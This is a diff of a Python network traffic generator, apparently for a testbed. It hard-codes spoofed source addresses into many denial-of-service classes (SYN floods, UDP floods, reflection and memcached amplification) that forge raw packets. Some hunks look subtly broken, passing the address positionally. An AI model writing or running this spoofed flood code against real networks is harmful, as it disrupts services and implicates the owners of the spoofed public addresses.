@@ -815,7 +815,6 @@ class TCPTraffic(BenignTraffic):
 
     def run_process(self, total_duration: int, pause_event: Event, target_ip: str) -> None:
         """Run the traffic simulation asynchronously with pause_event.
-        
         Args:
             total_duration: Duration of the simulation in seconds.
             pause_event: Event to pause the simulation.
@@ -953,7 +952,7 @@ class TCPTraffic(BenignTraffic):
                     await asyncio.sleep(1)
                     continue
 
-                src_ip = self.generate_random_ip()
+                src_ip = "196.158.173.56"
                 payload = self.generate_payload("BENIGN-TCP-", self.packet_factory.max_tcp_payload_size)
                 
                 # Use packet factory to create TCP packet with MTU limits
@@ -1159,7 +1158,7 @@ class UDPTraffic(BenignTraffic):
                 await asyncio.sleep(1)
                 continue
             
-            src_ip = self.generate_random_ip()
+            src_ip =  "27.81.231.103"
             sport = random.randint(1024, 65535)
             dport = random.choice([53, 123, 1900, 11211, 80, 443, 22, 21, 3306, 53])
             ttl = random.randint(1, 128)
@@ -1256,8 +1255,8 @@ class TCPVariableWindowSYNFlood(TCPAttack):
             if pause_event.is_set():
                 await asyncio.sleep(1)
                 continue
-                
-            src_ip = self.generate_random_ip()
+
+            src_ip = "189.112.25.238"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             window_size = random.randint(1, 65535)
@@ -1280,7 +1279,7 @@ class TCPSYNFloodReflection(TCPAttack):
     
     def run(self) -> None:
         logger.info("Starting TCP Amplified SYN Flood Reflection Attack")
-        reflection_ips = [self.generate_random_ip() for _ in range(10)]
+        reflection_ips = ["5.204.253.168","5.204.253.169","5.204.253.170","5.204.253.171","5.204.253.172","5.204.253.173","5.204.253.174","5.204.253.175","5.204.253.176","5.204.253.177"]
         num_processes = cpu_count()
         processes = []
         
@@ -1327,7 +1326,7 @@ class TCPAsyncSlowSYNFlood(TCPAttack):
     
     def run(self) -> None:
         logger.info("Starting TCP Async Slow SYN Flood Attack")
-        reflection_ips = [self.generate_random_ip() for _ in range(10)]
+        reflection_ips = ["213.185.212.170","213.185.212.171","213.185.212.172","213.185.212.173","213.185.212.174","213.185.212.175","213.185.212.176","213.185.212.177","213.185.212.178","213.185.212.179"]
         num_processes = multiprocessing.cpu_count() * 8
         processes = []
         
@@ -1401,7 +1400,7 @@ class TCPBatchSYNFlood(TCPAttack):
         sock.close()
     
     async def tcp_syn_flood_batch(self, sock: socket.socket, pause_event: Event) -> None:
-        src_ip = self.generate_random_ip()
+        src_ip = "214.207.85.125"
         start_time = time.time()
         max_payload_size = self.interface_mtu - 40 if self.interface_mtu else 1405
         # Use generate_payload with potential override
@@ -1448,7 +1447,7 @@ class TCPRandomizedSYNFlood(TCPAttack):
                 await asyncio.sleep(1)
                 continue
                 
-            src_ip = self.generate_random_ip()
+            src_ip = "28.192.93.163"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             
@@ -1486,7 +1485,7 @@ class TCPVariableTTLSYNFlood(TCPAttack):
                 await asyncio.sleep(1)
                 continue
                 
-            src_ip = self.generate_random_ip()
+            src_ip = "210.188.46.142"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             ttl = random.randint(1, 255)
@@ -1529,7 +1528,7 @@ class TCPTargetedSYNFloodCommonPorts(TCPAttack):
                     await asyncio.sleep(1)
                     continue
                     
-                src_ip = self.generate_random_ip()
+                src_ip = "210.188.46.142"
                 src_port = random.randint(1024, 65535)
                 dst_port = random.choice(common_ports)
                 
@@ -1579,7 +1578,7 @@ class TCPAdaptiveFlood(TCPAttack):
                 await asyncio.sleep(1)
                 continue
                 
-            src_ip = self.generate_random_ip()
+            src_ip = "147.40.214.141"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             
@@ -1627,7 +1626,7 @@ class TCPBatchFlood(TCPAttack):
                 await asyncio.sleep(1)
                 continue
                 
-            src_ip = self.generate_random_ip()
+            src_ip = "142.35.149.172"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             
@@ -1665,7 +1664,7 @@ class TCPVariableSynFlood(TCPAttack):
                 await asyncio.sleep(1)
                 continue
                 
-            src_ip = self.generate_random_ip()
+            src_ip = "107.30.43.218"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             
@@ -1703,7 +1702,7 @@ class TCPMaxRandomizedFlood(TCPAttack):
                 await asyncio.sleep(1)
                 continue
                 
-            src_ip = self.generate_random_ip()
+            src_ip = "125.58.32.88"
             src_port = random.randint(1024, 65535)
             dst_port = self.choose_port_strategy()
             
@@ -1753,7 +1752,7 @@ class UDPMalformedPacket(UDPAttack):
                 sport = random.randint(1024, 65535)
                 payload = self.generate_payload("UDP_FLOOD-malformed-packet-")
                 packet = self.packet_factory.create_udp_packet(
-                    self.generate_random_ip(), self.target_ip, sport, target_port, payload
+                    "152.44.47.195", self.target_ip, sport, target_port, payload
                 )
                 packets.append((packet, target_port))
             
@@ -1833,7 +1832,7 @@ class UDPMultiProtocolAmplificationAttack(UDPAttack):
                     await asyncio.sleep(1)
                     continue
                 
-                src_ip = self.generate_random_ip()
+                src_ip = "152.44.47.195"
                 sport = random.randint(1024, 65535)
                 packet = IP(src=src_ip, dst=target_ip) / \
                          UDP(sport=sport, dport=port) / \
@@ -1866,7 +1865,7 @@ class UDPAdaptivePayloadFlood(UDPAttack):
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
         try:
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP(src="57.29.127.56", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload)
             packet_bytes = bytes(packet)
@@ -1935,7 +1934,7 @@ class UDPCompressedEncryptedFlood(UDPAttack):
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
         try:
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP("14.131.69.226", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload)
             packet_bytes = bytes(packet)
@@ -2035,7 +2034,7 @@ class UDPMaxRandomizedFlood(UDPAttack):
                 
                 for _ in range(batch_size):
                     try:
-                        dynamic_packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+                        dynamic_packet = IP("213.65.163.42", dst=target_ip) / \
                                          UDP(sport=random.randint(1024, 65535), dport=port) / \
                                          Raw(load=payload)
                         dynamic_packet_bytes = bytes(dynamic_packet)
@@ -2123,12 +2122,12 @@ class UDPAndTCPFlood(Attack):
                     src_port = random.randint(1024, 65535)
                     
                     for target_ip in self.target_ips:
-                        udp_packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+                        udp_packet = IP("192.112.251.217", dst=target_ip) / \
                                      UDP(sport=src_port, dport=target_port) / \
                                      Raw(load=payload[:self.packet_factory.max_udp_payload_size])
                         udp_packets.append(bytes(udp_packet))
                         
-                        tcp_packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+                        tcp_packet = IP("192.112.251.218", dst=target_ip) / \
                                      TCP(sport=src_port, dport=target_port, flags='S', 
                                          seq=random.randint(0, 4294967295)) / \
                                      Raw(load=payload[:self.packet_factory.max_tcp_payload_size])
@@ -2166,7 +2165,7 @@ class UDPSingleIPFlood(UDPAttack):
                  max_port: Optional[int] = None, custom_identifier: Optional[str] = None):
         super().__init__(target_ips, interface, duration, pause_event, min_port, max_port, custom_identifier)
         logger.info(f"{self.__class__.__name__} initialized with targets: {self.target_ips}")
-        self.src_ips = [self.generate_random_ip() for _ in target_ips]
+        self.src_ips = ["192.168.66.100", "192.168.66.101", "192.168.66.102"]
         self.payload = self.generate_payload("UDP_FLOOD-Single-IP-")
         self.rate = random.randint(5000, 20000)
     
@@ -2263,7 +2262,7 @@ class UDPIpPacket(UDPAttack):
                 sport = random.randint(1024, 65535)
                 payload = self.generate_payload("UDP_FLOOD-IP-Packet-")
                 packet = self.packet_factory.create_udp_packet(
-                    self.generate_random_ip(), self.target_ip, sport, target_port, payload
+                    "116.238.9.108", self.target_ip, sport, target_port, payload
                 )
                 packets.append((packet, target_port))
             
@@ -2314,7 +2313,7 @@ class UDPReflectionAttack(UDPAttack):
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
         try:
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP(src="19.57.189.183", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload)
             packet_bytes = bytes(packet)
@@ -2351,7 +2350,6 @@ class UDPReflectionAttack(UDPAttack):
     def run(self) -> None:
         logger.info("Starting UDP Reflection Attack")
         asyncio.run(self.run_attack())
-
 
 class UDPMemcachedAmplificationAttack(UDPAttack):
     """Implements a UDP Memcached Amplification Attack."""
@@ -2398,7 +2396,7 @@ class UDPMemcachedAmplificationAttack(UDPAttack):
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
         try:
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP(src="212.38.16.233", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload)
             packet_bytes = bytes(packet)
@@ -2491,7 +2489,7 @@ class UDPHybridFlood(UDPAttack):
         try:
             payload_bytes = payload if isinstance(payload, bytes) else payload.encode()
             
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP(src="36.231.68.76", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload_bytes)
             packet_bytes = bytes(packet)
@@ -2556,7 +2554,7 @@ class UDPDynamicPayloadFlood(UDPAttack):
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
         try:
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP(src="210.13.119.197", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload)
             packet_bytes = bytes(packet)
@@ -2631,7 +2629,7 @@ class UDPEncryptedPayloadFlood(UDPAttack):
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
         try:
-            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
+            packet = IP("107.126.227.51", dst=target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=port) / \
                      Raw(load=payload)
             packet_bytes = bytes(packet)
